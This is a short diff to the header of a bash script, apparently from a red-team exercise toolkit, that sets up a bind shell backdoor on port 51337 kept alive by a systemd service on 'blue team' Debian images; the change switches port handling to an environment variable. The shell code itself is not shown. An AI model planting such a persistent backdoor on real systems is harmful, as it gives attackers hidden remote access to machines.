@@ -1,17 +1,16 @@
 #! /bin/bash
 
-# Name: Python BIND Shell Backdoor
+# Name: Systemd Service BIND Shell Backdoor
 # Notes: 
 # - Script stored in /bin/pshd
 # - systemd service configured to run the script (pshd.service)
-# - Usage: ./blue_python_bind_shell.sh [port]
-# - Default port is 51337
+# - Usage: ./blue_systemd_bind_shell.sh
+# - Set port with PORT env var, default is 51337
 # Valid Targets: Blue team debian based images
 
-PORT="51337"
-if [[ -n "$1" ]]
+if [[ ! -v PORT ]]
 then
-PORT=$1
+PORT="51337"
 fi
 
 echo "Creating BIND shell on port $PORT"
